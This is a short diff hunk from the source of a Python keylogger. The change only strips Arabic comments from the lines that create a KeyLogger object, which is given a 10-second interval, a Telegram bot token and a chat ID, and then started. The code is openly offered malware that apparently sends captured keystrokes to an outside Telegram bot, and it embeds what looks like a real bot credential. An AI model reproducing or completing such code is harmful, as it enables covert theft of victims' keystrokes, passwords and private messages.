@@ -59,8 +59,8 @@ class KeyLogger:
             
 if __name__ == "__main__":
     keylogger = KeyLogger(
-        interval=10,  # كل دقيقة
-        bot_token="7540605269:AAEN4Rcai0Tk0IGj18KisnEPI9VjMhdm-PY",  # استبدل بـ Token الخاص بالبوت
-        chat_id="6420168867"  # استبدل بـ chat_id الخاص بك
+        interval=10,  
+        bot_token="7540605269:AAEN4Rcai0Tk0IGj18KisnEPI9VjMhdm-PY",  
+        chat_id="6420168867" 
     )
     keylogger.Starting_Keylogger()
